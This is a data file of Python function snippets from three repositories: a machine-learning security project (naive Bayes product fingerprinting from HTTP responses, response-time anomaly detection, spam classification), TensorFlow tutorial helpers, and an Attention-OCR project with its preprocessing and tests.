13o-bbr-bbq/machine_learning_security,word_count_up,"def word_count_up(self, word, category):
    self.word_count.setdefault(category, {})
    self.word_count[category].setdefault(word, 0)
    self.word_count[category][word] += 1
    self.vocabularies.add(word)"
13o-bbr-bbq/machine_learning_security,category_count_up,"def category_count_up(self, category):
    self.category_count.setdefault(category, 0)
    self.category_count[category] += 1"
13o-bbr-bbq/machine_learning_security,train,"def train(self, doc, category):
    self.word_count_up(doc, category)
    self.category_count_up(category)"
13o-bbr-bbq/machine_learning_security,prior_prob,"def prior_prob(self, category):
    num_of_categories = sum(self.category_count.values())
    num_of_docs_of_the_category = self.category_count[category]
    return float(num_of_docs_of_the_category) / float(num_of_categories)"
13o-bbr-bbq/machine_learning_security,num_of_appearance,"def num_of_appearance(self, word, category):
    word_count = 0
    keyword_list = []
    for key_item in self.word_count[category]:
        list_match = re.findall(key_item, word, flags=re.IGNORECASE)
        if len(list_match) != 0:
            word_count += 1
            for item in list_match:
                keyword_list.append(item)
    prob = float(word_count) / float(len(self.word_count[category]))
    return (word_count, list(set(keyword_list)), prob)"
13o-bbr-bbq/machine_learning_security,word_prob,"def word_prob(self, word, category):
    (numerator, keyword_list, temp_prob) = self.num_of_appearance(word, category)
    numerator += 1
    denominator = sum(self.word_count[category].values()) + len(self.vocabularies)
    prob = float(numerator) / float(denominator)
    return (prob, keyword_list, temp_prob)"
13o-bbr-bbq/machine_learning_security,score,"def score(self, word, category):
    score = math.log(self.prior_prob(category))
    (prob, keyword_list, temp_prob) = self.word_prob(word, category)
    score += math.log(prob)
    return (score, prob, keyword_list, temp_prob)"
13o-bbr-bbq/machine_learning_security,classify,"def classify(self, doc):
    best_guessed_category = None
    max_prob_before = -sys.maxsize
    keyword_list = []
    classified_list = []
    for category in self.category_count.keys():
        (score, total_prob, feature_list, category_prob) = self.score(doc, category)
        classified_list.append([category, float(total_prob), feature_list])
        if score > max_prob_before:
            max_prob_before = score
            best_guessed_category = category
            keyword_list = feature_list
            classified_prob = total_prob
    return (best_guessed_category, float(classified_prob), keyword_list, classified_list)"
13o-bbr-bbq/machine_learning_security,__init__,"def __init__(self, utility):
    self.utility = utility
    config = configparser.ConfigParser()
    self.file_name = os.path.basename(__file__)
    self.full_path = os.path.dirname(os.path.abspath(__file__))
    self.root_path = os.path.join(self.full_path, '../')
    config.read(os.path.join(self.root_path, 'config.ini'))
    try:
        self.signatures_dir = os.path.join(self.root_path, config['Common']['signature_path'])
        self.signature_file = os.path.join(self.signatures_dir, config['VersionChecker']['signature_file'])
    except Exception as e:
        self.utility.print_message(FAIL, 'Reading config.ini is failure : {}'.format(e))
        sys.exit(1)"
13o-bbr-bbq/machine_learning_security,identify_product,"def identify_product(self, parsed, response, client):
    product_list = []
    try:
        with codecs.open(self.signature_file, 'r', 'utf-8') as fin:
            matching_patterns = fin.readlines()
            for (idx, pattern) in enumerate(matching_patterns):
                if (idx + 1) % 10 == 0:
                    client.keep_alive()
                items = pattern.replace('\r', '').replace('\n', '').split('@')
                product = items[0].lower()
                default_ver = items[1]
                signature = items[2]
                self.utility.print_message(OK, '{}/{} Check {} using [{}]'.format(idx + 1, len(matching_patterns), product, signature))
                obj_match = re.search(signature, response, flags=re.IGNORECASE)
                if obj_match is not None:
                    version = default_ver
                    if obj_match.re.groups > 1:
                        version = obj_match.group(2)
                    port_num = 80
                    path = os.path.split(parsed.path)[0]
                    if parsed.port is not None:
                        port_num = parsed.port
                    if path.endswith('/') is False:
                        path += '/'
                    product_list.append(product + '@' + version + '@' + str(port_num) + '@' + path)
                    msg = 'Find product={}/{}'.format(product, version)
                    self.utility.print_message(WARNING, msg)
    except Exception as e:
        msg = 'Identifying product is failure : {}'.format(e)
        self.utility.print_exception(e, msg)
    return product_list"
13o-bbr-bbq/machine_learning_security,get_product_name,"def get_product_name(self, parsed, response, client):
    self.utility.print_message(NOTE, 'Analyzing gathered HTTP response.')
    product_list = self.identify_product(parsed, response, client)
    if len(product_list) == 0:
        self.utility.print_message(WARNING, 'Product Not Found.')
    return product_list"
13o-bbr-bbq/machine_learning_security,__init__,"def __init__(self, utility):
    self.utility = utility
    config = configparser.ConfigParser()
    self.file_name = os.path.basename(__file__)
    self.full_path = os.path.dirname(os.path.abspath(__file__))
    self.root_path = os.path.join(self.full_path, '../')
    try:
        config.read(os.path.join(self.root_path, 'config.ini'))
    except Exception as e:
        self.utility.print_message(FAIL, 'Reading config.ini is failure : {}'.format(e))
        sys.exit(1)
    self.category_type = config['VersionCheckerML']['category']
    self.train_path = os.path.join(self.full_path, config['VersionCheckerML']['train_path'])
    self.trained_path = os.path.join(self.full_path, config['VersionCheckerML']['trained_path'])
    self.train_os_in = os.path.join(self.train_path, config['VersionCheckerML']['train_os_in'])
    self.train_os_out = os.path.join(self.trained_path, config['VersionCheckerML']['train_os_out'])
    self.train_web_in = os.path.join(self.train_path, config['VersionCheckerML']['train_web_in'])
    self.train_web_out = os.path.join(self.trained_path, config['VersionCheckerML']['train_web_out'])
    self.train_framework_in = os.path.join(self.train_path, config['VersionCheckerML']['train_framework_in'])
    self.train_framework_out = os.path.join(self.trained_path, config['VersionCheckerML']['train_framework_out'])
    self.train_cms_in = os.path.join(self.train_path, config['VersionCheckerML']['train_cms_in'])
    self.train_cms_out = os.path.join(self.trained_path, config['VersionCheckerML']['train_cms_out'])
    return"
13o-bbr-bbq/machine_learning_security,identify_product,"def identify_product(self, parsed, response, client):
    product_list = []
    try:
        list_category = self.category_type.split('@')
        for category in list_category:
            client.keep_alive()
            nb = None
            if category == 'OS':
                nb = self.train(self.train_os_in, self.train_os_out)
            elif category == 'WEB':
                nb = self.train(self.train_web_in, self.train_web_out)
            elif category == 'FRAMEWORK':
                nb = self.train(self.train_framework_in, self.train_framework_out)
            elif category == 'CMS':
                nb = self.train(self.train_cms_in, self.train_cms_out)
            else:
                self.utility.print_message(FAIL, 'Choose category is not found.')
                exit(1)
            (product, prob, keyword_list, classified_list) = nb.classify(response)
            if len(keyword_list) != 0:
                port_num = 80
                path = os.path.split(parsed.path)[0]
                if parsed.port is not None:
                    port_num = parsed.port
                if path.endswith('/') is False:
                    path += '/'
                product_list.append(product + '@*@' + str(port_num) + '@' + path)
                msg = 'Predict product={}/{}%, verson={}, trigger={}'.format(product, prob, '*', keyword_list)
                self.utility.print_message(OK, msg)
                self.utility.print_message(NOTE, 'category : {}'.format(category))
    except Exception as e:
        msg = 'Identifying product is failure : {}'.format(e)
        self.utility.print_exception(e, msg)
    return product_list"
13o-bbr-bbq/machine_learning_security,get_product_name,"def get_product_name(self, parsed, response, client):
    self.utility.print_message(NOTE, 'Analyzing gathered HTTP response using ML.')
    product_list = self.identify_product(parsed, response, client)
    if len(product_list) == 0:
        self.utility.print_message(WARNING, 'Product Not Found.')
    return product_list"
13o-bbr-bbq/machine_learning_security,train,"def train(self, in_file, out_file):
    nb = None
    if os.path.exists(out_file):
        with open(out_file, 'rb') as f:
            nb = pickle.load(f)
    else:
        nb = NaiveBayes()
        with codecs.open(in_file, 'r', 'utf-8') as fin:
            lines = fin.readlines()
            items = []
            for line in lines:
                words = line[:-2]
                train_words = words.split('@')
                items.append(train_words[1])
                nb.train(train_words[3], train_words[0])
        with open(out_file, 'wb') as f:
            pickle.dump(nb, f)
    return nb"
13o-bbr-bbq/machine_learning_security,watch,"def watch():
    timestamp = time.mktime(datetime.datetime.now().utctimetuple())
    while True:
        for file in os.listdir(DIR):
            if TARGET_LOG in file:
                target_file = os.path.join(DIR, file)
                file_timestamp = os.stat(target_file)[ST_MTIME]
                if timestamp < file_timestamp:
                    timestamp = file_timestamp
                    fin = codecs.open(target_file, encoding='utf-8')
                    content = fin.read()
                    fin.close()
                    check_logs(content)
        time.sleep(0.5)"
13o-bbr-bbq/machine_learning_security,check_logs,"def check_logs(content):
    global max_count
    global old_count
    all_res_time = re.findall('Response_time\\:(\\d{1,100}\\.\\d{1,100})*', content)
    if len(all_res_time) == 0:
        return
    all_res_time = list(map(float, all_res_time))
    response_time = all_res_time[old_count:]
    response_time = list(map(float, response_time))
    max_count = len(all_res_time)
    if len(all_res_time) > 0:
        anomaly_detection(response_time)"
13o-bbr-bbq/machine_learning_security,emb,"def emb(lst, dim):
    emb = np.empty((0, dim), float)
    for idx in range(len(lst) - dim + 1):
        tmp = np.array(lst[idx:idx + dim])[::-1].reshape((1, -1))
        emb = np.append(emb, tmp, axis=0)
    return emb"
13o-bbr-bbq/machine_learning_security,anomaly_detection,"def anomaly_detection(res_time):
    global max_count
    global old_count
    if len(res_time) < WINDOW_SIZE * 2:
        return
    train_data = res_time[0:WINDOW_SIZE]
    train = emb(train_data, WINDOW_SIZE)
    test_data = res_time[len(train_data):max_count]
    test = emb(test_data, WINDOW_SIZE)
    old_count += WINDOW_SIZE
    clf = NearestNeighbors(n_neighbors=K)
    clf.fit(train)
    distances = clf.kneighbors(test)[0]
    for d in distances:
        now_date = str(datetime.datetime.now().strftime('%H:%M:%S.%f')[:-3])
        print('Distance: {}'.format(d[0]))
        if RATE_WARNING <= d[0] < RATE_ERROR:
            ' Any notice. ex) posting slack, sending email and terminate scanner. '
            print('WARNING: Detact anomaly!! Now date: {}'.format(now_date))
        elif RATE_ERROR <= d[0]:
            ' Any notice. ex) posting slack, sending email and terminate scanner. '
            print('ERROR: Detact anomaly!! Now date: {}'.format(now_date))"
13o-bbr-bbq/machine_learning_security,get,"def get(self):
    param = self.get_argument('param')
    if param == 'normal':
        WebHandler.base_time = 0.01
    if param == 'attack':
        WebHandler.base_time = 0.5
    if param == 'load':
        WebHandler.base_time += 0.01
    time.sleep(WebHandler.base_time)"
13o-bbr-bbq/machine_learning_security,get_stopwords,"def get_stopwords():
    url = 'http://svn.sourceforge.jp/svnroot/slothlib/CSharp/Version1/SlothLib/NLP/Filter/StopWord/word/Japanese.txt'
    slothlib_file = urllib.request.urlopen(url)
    slothlib_stopwords = [line.decode('utf-8').strip() for line in slothlib_file]
    jpn_stopwords = [ss for ss in slothlib_stopwords if not ss == u'']
    jpn_symbols = ['’', '”', '‘', '。', '、', 'ー', '！', '？', '：', '；', '（', '）', '＊', '￥']
    eng_symbols = [""'"", '""', '`', '.', ',', '-', '!', '?', ':', ';', '(', ')', '*', '--', '\\']
    return jpn_stopwords + jpn_symbols + eng_symbols"
13o-bbr-bbq/machine_learning_security,judge_spam,"def judge_spam(X_train, y_train, stop_words, message, jp_sent_tokenizer, jp_chartype_tokenizer):
    fout = codecs.open(os.path.join('../dataset', 'temp.txt'), 'w', 'utf-8')
    fout.write(message)
    fout.close()
    spam = PlaintextCorpusReader('../dataset/', 'temp.txt', encoding='utf-8', para_block_reader=read_line_block, sent_tokenizer=jp_sent_tokenizer, word_tokenizer=jp_chartype_tokenizer)
    tokenize_message = '|'.join(spam.words())
    lst_bow = tokenize_message.replace('\n', '').replace('\r', '').split('|')
    while lst_bow.count('') > 0:
        lst_bow.remove('')
    vectorizer = CountVectorizer(stop_words=stop_words)
    vectorizer.fit(X_train)
    X_train = vectorizer.transform(X_train)
    clf = MultinomialNB(alpha=1.0)
    clf.fit(X_train, y_train)
    X_test = vectorizer.transform(lst_bow)
    y_preds = clf.predict_proba(X_test)
    result = ''
    if np.sum(y_preds[:, 0]) > np.sum(y_preds[:, 1]):
        result = clf.classes_[0]
    else:
        result = clf.classes_[1]
    print('[Judgement]\nThis mail is <{}>.\n{}: {}%, {}: {}%\n'.format(result, clf.classes_[0], str(round(np.mean(y_preds[:, 0]) * 100, 2)), clf.classes_[1], str(round(np.mean(y_preds[:, 1]) * 100, 2))))"
13o-bbr-bbq/machine_learning_security,print_top_words,"def print_top_words(model, feature_names):
    for (topic_idx, topic) in enumerate(model.components_):
        message = 'Topic #{}: '.format(topic_idx + 1)
        message += ' '.join([feature_names[i] for i in topic.argsort()[:-n_top_words - 1:-1]])
        print(message)"
13o-bbr-bbq/machine_learning_security,plot_conv_outputs,"def plot_conv_outputs(layer_num, layer_name, outputs):
    filters = outputs.shape[2]
    for idx in range(filters):
        plt.subplots_adjust(wspace=0.4, hspace=0.6)
        plt.subplot(filters / 6 + 1, 6, idx + 1)
        plt.xticks([])
        plt.yticks([])
        plt.xlabel('filter {}'.format(idx))
        plt.imshow(outputs[:, :, idx])
    plt.savefig('{}_{}.jpg'.format(layer_name, layer_num))"
13o-bbr-bbq/machine_learning_security,sample_count,"def sample_count(sample_path):
    sample = 0
    for (root, dirs, files) in os.walk(sample_path):
        sample += len(files)
    return sample"
527515025/My-TensorFlow-tutorials,add_layer,"def add_layer(inputs, in_size, out_size, layer_name, activation_function=None):
    Weights = tf.Variable(tf.random_normal([in_size, out_size]))
    biases = tf.Variable(tf.zeros([1, out_size]) + 0.1)
    Wx_plus_b = tf.matmul(inputs, Weights) + biases
    Wx_plus_b = tf.nn.dropout(Wx_plus_b, keep_prob)
    if activation_function is None:
        outputs = Wx_plus_b
    else:
        outputs = activation_function(Wx_plus_b)
        tf.summary.histogram(layer_name + '/outputs', outputs)
    return outputs"
527515025/My-TensorFlow-tutorials,compute_accuracy,"def compute_accuracy(v_xs, v_ys):
    global prediction
    y_pre = sess.run(prediction, feed_dict={xs: v_xs, keep_prob: 1})
    correct_prediction = tf.equal(tf.argmax(y_pre, 1), tf.argmax(v_ys, 1))
    accuracy = tf.reduce_mean(tf.cast(correct_prediction, tf.float32))
    result = sess.run(accuracy, feed_dict={xs: v_xs, ys: v_ys, keep_prob: 1})
    return result"
527515025/My-TensorFlow-tutorials,compute_accuracy,"def compute_accuracy(v_xs, v_ys):
    global prediction
    y_pre = sess.run(prediction, feed_dict={xs: v_xs, keep_prob: 1})
    correct_prediction = tf.equal(tf.argmax(y_pre, 1), tf.argmax(v_ys, 1))
    accuracy = tf.reduce_mean(tf.cast(correct_prediction, tf.float32))
    result = sess.run(accuracy, feed_dict={xs: v_xs, ys: v_ys, keep_prob: 1})
    return result"
527515025/My-TensorFlow-tutorials,weight_variable,"def weight_variable(shape):
    initial = tf.truncated_normal(shape, stddev=0.1)
    return tf.Variable(initial)"
527515025/My-TensorFlow-tutorials,bias_variable,"def bias_variable(shape):
    initial = tf.constant(0.1, shape=shape)
    return tf.Variable(initial)"
527515025/My-TensorFlow-tutorials,conv2d,"def conv2d(x, W):
    return tf.nn.conv2d(x, W, strides=[1, 1, 1, 1], padding='SAME')"
527515025/My-TensorFlow-tutorials,max_poo_2x2,"def max_poo_2x2(x):
    return tf.nn.max_pool(x, ksize=[1, 2, 2, 1], strides=[1, 2, 2, 1], padding='SAME')"
A-bone1/Attention-ocr-Chinese-Version,define,"def define():
    """"""Define common flags.""""""
    flags.DEFINE_integer('batch_size', 32, 'Batch size.')
    flags.DEFINE_integer('crop_width', None, 'Width of the central crop for images.')
    flags.DEFINE_integer('crop_height', None, 'Height of the central crop for images.')
    flags.DEFINE_string('train_log_dir', '/home/ucmed/opt/python/models-master/research/attention_ocr/python/logs', 'Directory where to write event logs.')
    flags.DEFINE_string('dataset_name', 'fsns', 'Name of the dataset. Supported: fsns')
    flags.DEFINE_string('split_name', 'train', 'Dataset split name to run evaluation for: test,train.')
    flags.DEFINE_string('dataset_dir', None, 'Dataset root folder.')
    flags.DEFINE_string('checkpoint', '', 'Path for checkpoint to restore weights from.')
    flags.DEFINE_string('master', '', 'BNS name of the TensorFlow master to use.')
    flags.DEFINE_float('learning_rate', 0.004, 'learning rate')
    flags.DEFINE_string('optimizer', 'momentum', 'the optimizer to use')
    flags.DEFINE_string('momentum', 0.9, 'momentum value for the momentum optimizer if used')
    flags.DEFINE_bool('use_augment_input', True, 'If True will use image augmentation')
    flags.DEFINE_string('final_endpoint', 'Mixed_5d', 'Endpoint to cut inception tower')
    flags.DEFINE_bool('use_attention', True, 'If True will use the attention mechanism')
    flags.DEFINE_bool('use_autoregression', True, 'If True will use autoregression (a feedback link)')
    flags.DEFINE_integer('num_lstm_units', 256, 'number of LSTM units for sequence LSTM')
    flags.DEFINE_float('weight_decay', 4e-05, 'weight decay for char prediction FC layers')
    flags.DEFINE_float('lstm_state_clip_value', 10.0, 'cell state is clipped by this value prior to the cell output activation')
    flags.DEFINE_float('label_smoothing', 0.1, 'weight for label smoothing')
    flags.DEFINE_bool('ignore_nulls', True, 'ignore null characters for computing the loss')
    flags.DEFINE_bool('average_across_timesteps', False, 'divide the returned cost by the total label weight')"
A-bone1/Attention-ocr-Chinese-Version,get_crop_size,"def get_crop_size():
    if FLAGS.crop_width and FLAGS.crop_height:
        return (FLAGS.crop_width, FLAGS.crop_height)
    else:
        return None"
A-bone1/Attention-ocr-Chinese-Version,create_dataset,"def create_dataset(split_name):
    ds_module = getattr(datasets, FLAGS.dataset_name)
    return ds_module.get_split(split_name, dataset_dir=FLAGS.dataset_dir)"
A-bone1/Attention-ocr-Chinese-Version,create_mparams,"def create_mparams():
    return {'conv_tower_fn': model.ConvTowerParams(final_endpoint=FLAGS.final_endpoint), 'sequence_logit_fn': model.SequenceLogitsParams(use_attention=FLAGS.use_attention, use_autoregression=FLAGS.use_autoregression, num_lstm_units=FLAGS.num_lstm_units, weight_decay=FLAGS.weight_decay, lstm_state_clip_value=FLAGS.lstm_state_clip_value), 'sequence_loss_fn': model.SequenceLossParams(label_smoothing=FLAGS.label_smoothing, ignore_nulls=FLAGS.ignore_nulls, average_across_timesteps=FLAGS.average_across_timesteps)}"
A-bone1/Attention-ocr-Chinese-Version,create_model,"def create_model(*args, **kwargs):
    ocr_model = model.Model(*args, mparams=create_mparams(), **kwargs)
    return ocr_model"
A-bone1/Attention-ocr-Chinese-Version,augment_image,"def augment_image(image):
    """"""Augmentation the image with a random modification.

  Args:
    image: input Tensor image of rank 3, with the last dimension
           of size 3.

  Returns:
    Distorted Tensor image of the same shape.
  """"""
    with tf.variable_scope('AugmentImage'):
        height = image.get_shape().dims[0].value
        width = image.get_shape().dims[1].value
        (bbox_begin, bbox_size, _) = tf.image.sample_distorted_bounding_box(tf.shape(image), bounding_boxes=tf.zeros([0, 0, 4]), min_object_covered=0.8, aspect_ratio_range=[0.8, 1.2], area_range=[0.8, 1.0], use_image_if_no_bounding_boxes=True)
        distorted_image = tf.slice(image, bbox_begin, bbox_size)
        distorted_image = inception_preprocessing.apply_with_random_selector(distorted_image, lambda x, method: tf.image.resize_images(x, [height, width], method), num_cases=4)
        distorted_image.set_shape([height, width, 3])
        distorted_image = inception_preprocessing.apply_with_random_selector(distorted_image, functools.partial(inception_preprocessing.distort_color, fast_mode=False), num_cases=4)
        distorted_image = tf.clip_by_value(distorted_image, -1.5, 1.5)
    return distorted_image"
A-bone1/Attention-ocr-Chinese-Version,central_crop,"def central_crop(image, crop_size):
    """"""Returns a central crop for the specified size of an image.

  Args:
    image: A tensor with shape [height, width, channels]
    crop_size: A tuple (crop_width, crop_height)

  Returns:
    A tensor of shape [crop_height, crop_width, channels].
  """"""
    with tf.variable_scope('CentralCrop'):
        (target_width, target_height) = crop_size
        (image_height, image_width) = (tf.shape(image)[0], tf.shape(image)[1])
        assert_op1 = tf.Assert(tf.greater_equal(image_height, target_height), ['image_height < target_height', image_height, target_height])
        assert_op2 = tf.Assert(tf.greater_equal(image_width, target_width), ['image_width < target_width', image_width, target_width])
        with tf.control_dependencies([assert_op1, assert_op2]):
            offset_width = (image_width - target_width) / 2
            offset_height = (image_height - target_height) / 2
            return tf.image.crop_to_bounding_box(image, offset_height, offset_width, target_height, target_width)"
A-bone1/Attention-ocr-Chinese-Version,preprocess_image,"def preprocess_image(image, augment=False, central_crop_size=None, num_towers=4):
    """"""Normalizes image to have values in a narrow range around zero.

  Args:
    image: a [H x W x 3] uint8 tensor.
    augment: optional, if True do random image distortion.
    central_crop_size: A tuple (crop_width, crop_height).
    num_towers: optional, number of shots of the same image in the input image.

  Returns:
    A float32 tensor of shape [H x W x 3] with RGB values in the required
    range.
  """"""
    with tf.variable_scope('PreprocessImage'):
        image = tf.image.convert_image_dtype(image, dtype=tf.float32)
        if augment or central_crop_size:
            if num_towers == 1:
                images = [image]
            else:
                images = tf.split(value=image, num_or_size_splits=num_towers, axis=1)
            if central_crop_size:
                view_crop_size = (central_crop_size[0] / num_towers, central_crop_size[1])
                images = [central_crop(img, view_crop_size) for img in images]
            if augment:
                images = [augment_image(img) for img in images]
            image = tf.concat(images, 1)
        image = tf.subtract(image, 0.5)
        image = tf.multiply(image, 2.5)
    return image"
A-bone1/Attention-ocr-Chinese-Version,get_data,"def get_data(dataset, batch_size, augment=False, central_crop_size=None, shuffle_config=None, shuffle=True):
    """"""Wraps calls to DatasetDataProviders and shuffle_batch.

  For more details about supported Dataset objects refer to datasets/fsns.py.

  Args:
    dataset: a slim.data.dataset.Dataset object.
    batch_size: number of samples per batch.
    augment: optional, if True does random image distortion.
    central_crop_size: A CharLogittuple (crop_width, crop_height).
    shuffle_config: A namedtuple ShuffleBatchConfig.
    shuffle: if True use data shuffling.

  Returns:

  """"""
    if not shuffle_config:
        shuffle_config = DEFAULT_SHUFFLE_CONFIG
    provider = slim.dataset_data_provider.DatasetDataProvider(dataset, shuffle=shuffle, common_queue_capacity=2 * batch_size, common_queue_min=batch_size)
    (image_orig, label) = provider.get(['image', 'label'])
    image = preprocess_image(image_orig, augment, central_crop_size, num_towers=dataset.num_of_views)
    label_one_hot = slim.one_hot_encoding(label, dataset.num_char_classes)
    (images, images_orig, labels, labels_one_hot) = tf.train.shuffle_batch([image, image_orig, label, label_one_hot], batch_size=batch_size, num_threads=shuffle_config.num_batching_threads, capacity=shuffle_config.queue_capacity, min_after_dequeue=shuffle_config.min_after_dequeue)
    return InputEndpoints(images=images, images_orig=images_orig, labels=labels, labels_one_hot=labels_one_hot)"
A-bone1/Attention-ocr-Chinese-Version,setUp,"def setUp(self):
    tf.test.TestCase.setUp(self)"
A-bone1/Attention-ocr-Chinese-Version,test_preprocessed_image_values_are_in_range,"def test_preprocessed_image_values_are_in_range(self):
    image_shape = (5, 4, 3)
    fake_image = np.random.randint(low=0, high=255, size=image_shape)
    image_tf = data_provider.preprocess_image(fake_image)
    with self.test_session() as sess:
        image_np = sess.run(image_tf)
    self.assertEqual(image_np.shape, image_shape)
    (min_value, max_value) = (np.min(image_np), np.max(image_np))
    self.assertTrue(-1.28 < min_value and min_value < 1.27)
    self.assertTrue(-1.28 < max_value and max_value < 1.27)"
A-bone1/Attention-ocr-Chinese-Version,test_provided_data_has_correct_shape,"def test_provided_data_has_correct_shape(self):
    batch_size = 4
    data = data_provider.get_data(dataset=datasets.fsns_test.get_test_split(), batch_size=batch_size, augment=True, central_crop_size=None)
    with self.test_session() as sess, queues.QueueRunners(sess):
        (images_np, labels_np) = sess.run([data.images, data.labels_one_hot])
    self.assertEqual(images_np.shape, (batch_size, 150, 600, 3))
    self.assertEqual(labels_np.shape, (batch_size, 37, 134))"
A-bone1/Attention-ocr-Chinese-Version,test_optionally_applies_central_crop,"def test_optionally_applies_central_crop(self):
    batch_size = 4
    data = data_provider.get_data(dataset=datasets.fsns_test.get_test_split(), batch_size=batch_size, augment=True, central_crop_size=(500, 100))
    with self.test_session() as sess, queues.QueueRunners(sess):
        images_np = sess.run(data.images)
    self.assertEqual(images_np.shape, (batch_size, 100, 500, 3))"
A-bone1/Attention-ocr-Chinese-Version,get_dataset_image_size,"def get_dataset_image_size(dataset_name):
    ds_module = getattr(datasets, dataset_name)
    (height, width, _) = ds_module.DEFAULT_CONFIG['image_shape']
    return (width, height)"
A-bone1/Attention-ocr-Chinese-Version,load_images,"def load_images(file_pattern, batch_size, dataset_name):
    (width, height) = get_dataset_image_size(dataset_name)
    images_actual_data = np.ndarray(shape=(batch_size, height, width, 3), dtype='uint8')
    for i in range(batch_size):
        path = file_pattern % i
        print('Reading %s' % path)
        pil_image = PIL.Image.open(tf.gfile.GFile(path, 'rb'))
        pil_image = pil_image.resize((600, 150), PIL.Image.ANTIALIAS)
        images_actual_data[i, ...] = np.asarray(pil_image)
    return images_actual_data"
A-bone1/Attention-ocr-Chinese-Version,create_model,"def create_model(batch_size, dataset_name):
    (width, height) = get_dataset_image_size(dataset_name)
    dataset = common_flags.create_dataset(split_name=FLAGS.split_name)
    model = common_flags.create_model(num_char_classes=dataset.num_char_classes, seq_length=dataset.max_sequence_length, num_views=dataset.num_of_views, null_code=dataset.null_code, charset=dataset.charset)
    raw_images = tf.placeholder(tf.uint8, shape=[batch_size, height, width, 3])
    images = tf.map_fn(data_provider.preprocess_image, raw_images, dtype=tf.float32)
    endpoints = model.create_base(images, labels_one_hot=None)
    return (raw_images, endpoints)"
A-bone1/Attention-ocr-Chinese-Version,run,"def run(checkpoint, batch_size, dataset_name, image_path_pattern):
    (images_placeholder, endpoints) = create_model(batch_size, dataset_name)
    images_data = load_images(image_path_pattern, batch_size, dataset_name)
    session_creator = monitored_session.ChiefSessionCreator(checkpoint_filename_with_path=checkpoint)
    with monitored_session.MonitoredSession(session_creator=session_creator) as sess:
        predictions = sess.run(endpoints.predicted_text, feed_dict={images_placeholder: images_data})
    return predictions.tolist()"
A-bone1/Attention-ocr-Chinese-Version,main,"def main(_):
    print('Predicted strings:')
    predictions = run(FLAGS.checkpoint, FLAGS.batch_size, FLAGS.dataset_name, FLAGS.image_path_pattern)
    for line in predictions:
        print(line)"
A-bone1/Attention-ocr-Chinese-Version,setUp,"def setUp(self):
    super(DemoInferenceTest, self).setUp()
    for suffix in ['.meta', '.index', '.data-00000-of-00001']:
        filename = _CHECKPOINT + suffix
        self.assertTrue(tf.gfile.Exists(filename), msg='Missing checkpoint file %s. Please download and extract it from %s' % (filename, _CHECKPOINT_URL))
    self._batch_size = 32"
A-bone1/Attention-ocr-Chinese-Version,test_moving_variables_properly_loaded_from_a_checkpoint,"def test_moving_variables_properly_loaded_from_a_checkpoint(self):
    batch_size = 32
    dataset_name = 'fsns'
    (images_placeholder, endpoints) = demo_inference.create_model(batch_size, dataset_name)
    image_path_pattern = 'testdata/fsns_train_%02d.png'
    images_data = demo_inference.load_images(image_path_pattern, batch_size, dataset_name)
    tensor_name = 'AttentionOcr_v1/conv_tower_fn/INCE/InceptionV3/Conv2d_2a_3x3/BatchNorm/moving_mean'
    moving_mean_tf = tf.get_default_graph().get_tensor_by_name(tensor_name + ':0')
    reader = tf.train.NewCheckpointReader(_CHECKPOINT)
    moving_mean_expected = reader.get_tensor(tensor_name)
    session_creator = monitored_session.ChiefSessionCreator(checkpoint_filename_with_path=_CHECKPOINT)
    with monitored_session.MonitoredSession(session_creator=session_creator) as sess:
        moving_mean_np = sess.run(moving_mean_tf, feed_dict={images_placeholder: images_data})
    self.assertAllEqual(moving_mean_expected, moving_mean_np)"
A-bone1/Attention-ocr-Chinese-Version,test_correct_results_on_test_data,"def test_correct_results_on_test_data(self):
    image_path_pattern = 'testdata/fsns_train_%02d.png'
    predictions = demo_inference.run(_CHECKPOINT, self._batch_size, 'fsns', image_path_pattern)
    self.assertEqual(['Boulevard de Lunel░░░░░░░░░░░░░░░░░░░', 'Rue de Provence░░░░░░░░░░░░░░░░░░░░░░', 'Rue de Port Maria░░░░░░░░░░░░░░░░░░░░', 'Avenue Charles Gounod░░░░░░░░░░░░░░░░', 'Rue de l‘Aurore░░░░░░░░░░░░░░░░░░░░░░', 'Rue de Beuzeville░░░░░░░░░░░░░░░░░░░░', 'Rue d‘Orbey░░░░░░░░░░░░░░░░░░░░░░░░░░', 'Rue Victor Schoulcher░░░░░░░░░░░░░░░░', 'Rue de la Gare░░░░░░░░░░░░░░░░░░░░░░░', 'Rue des Tulipes░░░░░░░░░░░░░░░░░░░░░░', 'Rue André Maginot░░░░░░░░░░░░░░░░░░░░', 'Route de Pringy░░░░░░░░░░░░░░░░░░░░░░', 'Rue des Landelles░░░░░░░░░░░░░░░░░░░░', 'Rue des Ilettes░░░░░░░░░░░░░░░░░░░░░░', 'Avenue de Maurin░░░░░░░░░░░░░░░░░░░░░', 'Rue Théresa░░░░░░░░░░░░░░░░░░░░░░░░░░', 'Route de la Balme░░░░░░░░░░░░░░░░░░░░', 'Rue Hélène Roederer░░░░░░░░░░░░░░░░░░', 'Rue Emile Bernard░░░░░░░░░░░░░░░░░░░░', 'Place de la Mairie░░░░░░░░░░░░░░░░░░░', 'Rue des Perrots░░░░░░░░░░░░░░░░░░░░░░', 'Rue de la Libération░░░░░░░░░░░░░░░░░', 'Impasse du Capcir░░░░░░░░░░░░░░░░░░░░', 'Avenue de la Grand Mare░░░░░░░░░░░░░░', 'Rue Pierre Brossolette░░░░░░░░░░░░░░░', 'Rue de Provence░░░░░░░░░░░░░░░░░░░░░░', 'Rue du Docteur Mourre░░░░░░░░░░░░░░░░', 'Rue d‘Ortheuil░░░░░░░░░░░░░░░░░░░░░░░', 'Rue des Sarments░░░░░░░░░░░░░░░░░░░░░', 'Rue du Centre░░░░░░░░░░░░░░░░░░░░░░░░', 'Impasse Pierre Mourgues░░░░░░░░░░░░░░', 'Rue Marcel Dassault░░░░░░░░░░░░░░░░░░'], predictions)"
A-bone1/Attention-ocr-Chinese-Version,main,"def main(_):
    if not tf.gfile.Exists(FLAGS.eval_log_dir):
        tf.gfile.MakeDirs(FLAGS.eval_log_dir)
    dataset = common_flags.create_dataset(split_name=FLAGS.split_name)
    model = common_flags.create_model(dataset.num_char_classes, dataset.max_sequence_length, dataset.num_of_views, dataset.null_code)
    data = data_provider.get_data(dataset, FLAGS.batch_size, augment=False, central_crop_size=common_flags.get_crop_size())
    endpoints = model.create_base(data.images, labels_one_hot=None)
    model.create_loss(data, endpoints)
    eval_ops = model.create_summaries(data, endpoints, dataset.charset, is_training=False)
    slim.get_or_create_global_step()
    session_config = tf.ConfigProto(device_count={'GPU': 0})
